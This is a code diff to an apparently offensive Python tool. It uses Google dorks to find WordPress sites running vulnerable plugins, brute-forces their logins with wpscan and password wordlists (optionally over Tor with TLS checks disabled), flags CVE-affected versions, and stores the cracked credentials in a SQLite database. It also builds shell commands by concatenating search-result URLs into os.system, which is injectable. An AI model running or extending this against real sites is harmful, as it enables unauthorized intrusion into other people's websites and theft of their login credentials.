@@ -23,45 +23,66 @@ def checkvuln(pathfile):
     with open(pathfile) as json_file:
         obj_data = json.load(json_file)
 
-        if 'joomsport' in str(obj_data):
-            print('joomsport FOUND')
-            # Check for vulnerability version in JoomSport 3.3 - SQL INJECTION
-            if str(obj_data['plugins']['joomsport-sports-league-results-management']['version']['number']) == '3.3':
-                print(colored(
-                    "\t > Found JoomSport " +
-                    obj_data['plugins']['joomsport-sports-league-results-management']['version'][
-                        'number'] + " vulnerable to SQL Injection (CVE-2019-14348)", 'magenta'))
-        if 'Social Warfare' in str(obj_data):
-            # Check for vulnerability version in Social Warfare Plugin < 3.5.3 - RCE
-            if str(obj_data['plugins']['social-warfare']['version']['number']) < '3.5.3':
-                print(colored("\t > Found Social Warfare " + obj_data['plugins']['social-warfare']['version'][
-                    'number'] + " vulnerable to Remote Code Execution (CVE-2019-9978)", 'magenta'))
-        # Check WAF
-        if 'WAF' in str(obj_data):
+        # Check vulnerabilities only if scanned was completed successful using password_attack key in dict
+        if 'password_attack' in obj_data:
+            # CHECK CORE WORDPRESS VULNERABLE VERSION
+            if str(obj_data['version']['number']) == '4.6':
+                print(colored("\t > Found WordPress " + obj_data['version']['number'] + " vulnerable to RCE (CVE-2016-10033)", 'magenta'))
+
+            # JOOMSPORT
+            if 'joomsport' in str(obj_data):
+                # Check for vulnerability version in JoomSport 3.3 - SQL INJECTION
+                if str(obj_data['plugins']['joomsport-sports-league-results-management']['version']['number']) == '3.3':
+                    print(colored("\t > Found JoomSport " + obj_data['plugins']['joomsport-sports-league-results-management']['version']['number'] + " vulnerable to SQL Injection (CVE-2019-14348)", 'magenta'))
+
+            # SOCIAL WARFARE
+            if 'Social Warfare' in str(obj_data):
+                # Check for vulnerability version in Social Warfare Plugin < 3.5.3 - RCE
+                if str(obj_data['plugins']['social-warfare']['version']['number']) < '3.5.3':
+                    print(colored("\t > Found Social Warfare " + obj_data['plugins']['social-warfare']['version']['number'] + " vulnerable to Remote Code Execution (CVE-2019-9978)", 'magenta'))
+
+            # CONTACT FORM 7
+            if 'contact-form-7' in str(obj_data):
+                # Check for vulnerability version in Contact Form 7 - Unrestricted File Upload
+                if str(obj_data['plugins']['contact-form-7']['version']['number']) < '5.3.2':
+                    print(colored("\t > Found Contact Form 7 " + obj_data['plugins']['contact-form-7']['version']['number'] + " vulnerable to Unrestricted File Upload (CVE-2020-35489)", 'magenta'))
+
+            # YOAST SEO
+            if 'wordpress-seo' in str(obj_data):
+                # Check for vulnerability version in Yoast SEO - Blind SQL Injection
+                if str(obj_data['plugins']['wordpress-seo']['version']['number']) == '1.7.3.3':
+                    print(colored("\t > Found Yoast SEO " + obj_data['plugins']['wordpress-seo']['version']['number'] + " vulnerable to Blind SQL Injection (CVE-2015-2292)", 'magenta'))
+
+
+        # Check for some errors, timeouts, waf and so on..
+        elif 'WAF' in str(obj_data):
             print(colored("\t WAF Detected!", 'red'))
-        # Check if timeout is reached
         elif 'Timeout was reached' in str(obj_data):
             print(colored("\t Timeout Reached!", 'red'))
-        # Check if site is not running wordpress (due to wrong result in dork, happens!)
         elif 'scan_aborted' in str(obj_data):
-            print(colored("\t Website is up, but does not seem to be running WordPress!", 'red'))
-
+            print(colored("\t Aborted due to some redirect or website not running Wordpress!", 'red'))
+        else:
+            print(colored("\t Aborted for unrecognized error!", 'red'))
 
 def showdorks():
     """Show Wordpress google dorks available and returns choosen"""
 
-    # Get all Wordpress sites general query
+    # Google Dork wordpress general query
     dork1 = "\"index of\" inurl:wp-content/\""
-    # Get all Wordpress sites using WP Shopping Cart plugin
+    # Google Dork WP Shopping Cart plugin
     dork2 = "\"inurl:\"/wp-content/plugins/wp-shopping-cart/\""
-    # Get all Wordpress HTTP older sites (exclude pdf files from results)
+    # Google Dork HTTP older sites (exclude pdf files from results)
     dork3 = "inurl:wp-content/ inurl:http before:2016 -filetype.pdf"
-    # Get all Wordpress sites another general query
+    # Google Dork another general query
     dork4 = "\"index of \":wp-content/ intitle:\"WordPress\""
-    # Get all Wordpress sites using JoomSport plugin
+    # Google Dork using JoomSport plugin
     dork5 = "intext:powered by JoomSport - sport WordPress plugin"
-    # Get all Wordpress sites using Social Warfare plugin
+    # Google Dork using Social Warfare plugin
     dork6 = "inurl:wp-content/plugins/social-warfare"
+    # Google Dork Contact Form 7
+    dork7 = "inurl:wp-content/plugins/contact-form-7"
+    # Google Dork Yoast SEO
+    dork8 = "inurl:wp-content/plugins/wordpress-seo"
 
     table = PrettyTable()
 
@@ -73,16 +94,20 @@ def showdorks():
     table.add_row([4, dork4, "Wordpress another general query"])
     table.add_row([5, dork5, "Wordpress JoomSport (CVE-2019-14348)"])
     table.add_row([6, dork6, "Wordpress Social Warfare (CVE-2019-9978)"])
+    table.add_row([7, dork7, "Wordpress Contact Form 7 (CVE-2020-35489)"])
+    table.add_row([8, dork8, "Wordpress Yoast SEO (CVE-2015-2292)"])
 
     print()
     print(colored(table, 'magenta'))
     print()
 
+    dork = "\"index of\" inurl:wp-content/\""
+
     while True:
-        response = input(colored(" Choose dork to run [1-6] ", 'yellow'))
+        response = input(colored(" Choose dork to run [1-8] ", 'yellow'))
         if not response.isnumeric():
             continue
-        elif int(response) in range(1,7):
+        elif int(response) in range(1,9):
             if int(response) == 1:
                 dork = dork1
             elif int(response) == 2:
@@ -95,6 +120,10 @@ def showdorks():
                 dork = dork5
             elif int(response) == 6:
                 dork = dork6
+            elif int(response) == 7:
+                dork = dork7
+            elif int(response) == 8:
+                dork = dork8
             break
         else:
             continue
@@ -155,7 +184,7 @@ def savecreds(pathfile, url):
                         credsfound = True
         cursor.close()
     except sqlite3.Error:
-        print(colored(" Error while connecting to database!", 'red'))
+        print(colored(" Error while connecting to database! Creds NOT saved!", 'red'))
 
 
 def wpscan(wpurl, wordlists, pathfile, usetor):
@@ -163,12 +192,12 @@ def wpscan(wpurl, wordlists, pathfile, usetor):
 
     if usetor:
         # Run wpscan with tor
-        os.system("wpscan --request-timeout 500 --connect-timeout 120 --url " + wpurl + " --proxy socks5://127.0.0.1:9050 --rua -o " + pathfile + " -f json --passwords " + wordlists)
+        os.system("wpscan --disable-tls-checks --request-timeout 500 --connect-timeout 120 --url " + wpurl + " --proxy socks5://127.0.0.1:9050 --rua -o " + pathfile + " -f json --passwords " + wordlists)
         checkvuln(pathfile)
         savecreds(pathfile, wpurl)
     else:
         # Run wpscan without tor
-        os.system("wpscan --url " + wpurl + " --rua -o " + pathfile + " -f json --passwords " + wordlists)
+        os.system("wpscan --disable-tls-checks --url " + wpurl + " --rua -o " + pathfile + " -f json --passwords " + wordlists)
         checkvuln(pathfile)
         savecreds(pathfile, wpurl)
 
